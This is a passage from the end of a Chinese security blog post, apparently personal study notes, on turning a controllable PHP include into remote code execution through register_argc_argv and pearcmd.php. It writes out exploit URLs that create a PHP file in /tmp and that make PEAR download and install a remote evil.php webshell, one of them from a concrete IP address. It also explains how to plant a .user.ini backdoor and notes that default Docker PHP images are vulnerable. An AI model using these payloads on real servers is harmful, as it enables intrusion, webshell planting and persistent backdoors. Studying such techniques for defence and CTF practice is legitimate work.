<li>开启了register<em>argc</em>argv</li>
<li>存在可控的<code>include $_GET[&#39;f&#39;]</code>(即使是<code>include $_GET[&#39;f&#39;].php</code>)</li>
</ul>
<p>那么我们就可以通过上面的知识实现任意文件下载从而getshell:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//通过本地直接写入webshell,注意这里最好抓包然后用burpsuite或者直接curl执行，否则浏览器会将&lt; ? &gt; 转义</span><br><span class="line">// config-create可以直接创建配置文件，且第一个参数必须以/开头</span><br><span class="line">http://ip:port/include.php?f=pearcmd&amp;+config-create+/&lt;?=phpinfo();?&gt;+/tmp/evil.php</span><br><span class="line">// 通过远程直接下载webshel</span><br><span class="line">// web目录可写</span><br><span class="line">- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php</span><br><span class="line">- http://ip:port/tmp/pear/download/evil.php</span><br><span class="line">// tmp目录可写</span><br><span class="line">- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php</span><br><span class="line">- http://ip:port/include.php?f=/tmp/pear/download/evil</span><br></pre></td></tr></table></div></figure>

<p>&amp;+install+-R+&#x2F;tmp+<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://162.14.65.110:8888/1.php">http://162.14.65.110:8888/1.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="后门-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-后门">
          <a href="#后门-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-后门" class="heading-link"><i class="fas fa-link"></i></a><a href="#后门-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-后门" class="headerlink" title="后门[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#后门)"></a>后门[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#后门)</h2>
      <p>前面提到register<em>argc</em>argv是PHP INI PERDIR的,所以我们可以通过新建一个.user.ini设置register<em>argc</em>argv为On用于留后门</p>

        <h2 id="最后-docker-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-最后docker">
          <a href="#最后-docker-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-最后docker" class="heading-link"><i class="fas fa-link"></i></a><a href="#最后-docker-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-最后docker" class="headerlink" title="最后:docker[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#最后docker)"></a>最后:docker[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#最后docker)</h2>
      <p>在php官方提供的镜像下,默认是不使用php.ini的(在&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php中存在php.ini-production和php.ini-development,需要手动修改任意一个文件名为php.ini才会启动php.ini,而上面我们提到在php.ini中register<em>argc</em>argv都设置为Off)</p>
<p>而register<em>argc</em>argv在不设置的情况下默认为On,那么假如有一个默认的docker-php环境,并存在可控的<code>include $_GET[&#39;f&#39;]</code>(即使是include $_GET[‘f’].php),我们就可以利用这个漏洞实现getshell</p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://qingchuana.github.io">Qingchuan</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/">https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://qingchuana.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/10/18/%E9%A6%99%E5%B1%B1%E6%9D%AF/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">香山杯</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/10/17/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9B%B2%E6%B3%A8%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/"><span class="paginator-prev__text">命令注入盲注读取文件</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text">
          Pear命令读文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#registerargcargv%E4%B8%8Einclude-to-RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88-https-longlone-top-%E5%AE%89%E5%85%A8-%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-register-argc-argv%E4%B8%8Einclude-to-RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88-registerargcargv%E4%B8%8Einclude-to-rce%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88"><span class="toc-number">2.</span> <span class="toc-text">
          registerargcargv与include to RCE的巧妙组合[#](https:&#x2F;&#x2F;longlone.top&#x2F;安全&#x2F;安全研究&#x2F;register_argc_argv与include to RCE的巧妙组合&#x2F;#registerargcargv与include-to-rce的巧妙组合)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#registerargcargv-https-longlone-top-%E5%AE%89%E5%85%A8-%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-register-argc-argv%E4%B8%8Einclude-to-RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88-registerargcargv"><span class="toc-number">2.1.</span> <span class="toc-text">
          registerargcargv[#](https:&#x2F;&#x2F;longlone.top&#x2F;安全&#x2F;安全研究&#x2F;register_argc_argv与include to RCE的巧妙组合&#x2F;#registerargcargv)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pear-https-longlone-top-%E5%AE%89%E5%85%A8-%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-register-argc-argv%E4%B8%8Einclude-to-RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88-pear"><span class="toc-number">2.2.</span> <span class="toc-text">
          pear[#](https:&#x2F;&#x2F;longlone.top&#x2F;安全&#x2F;安全研究&#x2F;register_argc_argv与include to RCE的巧妙组合&#x2F;#pear)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pear-https-longlone-top-%E5%AE%89%E5%85%A8-%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-register-argc-argv%E4%B8%8Einclude-to-RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88-pear-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">
          pear[#](https:&#x2F;&#x2F;longlone.top&#x2F;安全&#x2F;安全研究&#x2F;register_argc_argv与include to RCE的巧妙组合&#x2F;#pear_1)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pear%E5%91%BD%E4%BB%A4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-https-longlone-top-%E5%AE%89%E5%85%A8-%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-register-argc-argv%E4%B8%8Einclude-to-RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88-pear%E5%91%BD%E4%BB%A4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">2.2.2.</span> <span class="toc-text">
          pear命令任意文件下载[#](https:&#x2F;&#x2F;longlone.top&#x2F;安全&#x2F;安全研究&#x2F;register_argc_argv与include to RCE的巧妙组合&#x2F;#pear命令任意文件下载)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%8E%A7%E5%88%B6-SERVER-%E2%80%98argv%E2%80%99-https-longlone-top-%E5%AE%89%E5%85%A8-%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-register-argc-argv%E4%B8%8Einclude-to-RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88-%E5%A6%82%E4%BD%95%E6%8E%A7%E5%88%B6-serverargv"><span class="toc-number">2.2.3.</span> <span class="toc-text">
          如何控制$_SERVER[‘argv’][#](https:&#x2F;&#x2F;longlone.top&#x2F;安全&#x2F;安全研究&#x2F;register_argc_argv与include to RCE的巧妙组合&#x2F;#如何控制_serverargv)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E5%88%B0%E9%A2%98%E7%9B%AE-https-longlone-top-%E5%AE%89%E5%85%A8-%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-register-argc-argv%E4%B8%8Einclude-to-RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88-%E5%9B%9E%E5%88%B0%E9%A2%98%E7%9B%AE"><span class="toc-number">2.3.</span> <span class="toc-text">
          回到题目[#](https:&#x2F;&#x2F;longlone.top&#x2F;安全&#x2F;安全研究&#x2F;register_argc_argv与include to RCE的巧妙组合&#x2F;#回到题目)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8-https-longlone-top-%E5%AE%89%E5%85%A8-%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-register-argc-argv%E4%B8%8Einclude-to-RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88-%E5%90%8E%E9%97%A8"><span class="toc-number">2.4.</span> <span class="toc-text">
          后门[#](https:&#x2F;&#x2F;longlone.top&#x2F;安全&#x2F;安全研究&#x2F;register_argc_argv与include to RCE的巧妙组合&#x2F;#后门)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%90%8E-docker-https-longlone-top-%E5%AE%89%E5%85%A8-%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-register-argc-argv%E4%B8%8Einclude-to-RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88-%E6%9C%80%E5%90%8Edocker"><span class="toc-number">2.5.</span> <span class="toc-text">
          最后:docker[#](https:&#x2F;&#x2F;longlone.top&#x2F;安全&#x2F;安全研究&#x2F;register_argc_argv与include to RCE的巧妙组合&#x2F;#最后docker)</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">Hello Stun</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">36</div><div class="sidebar-ov-state-item__name">归档</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Qingchuan</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>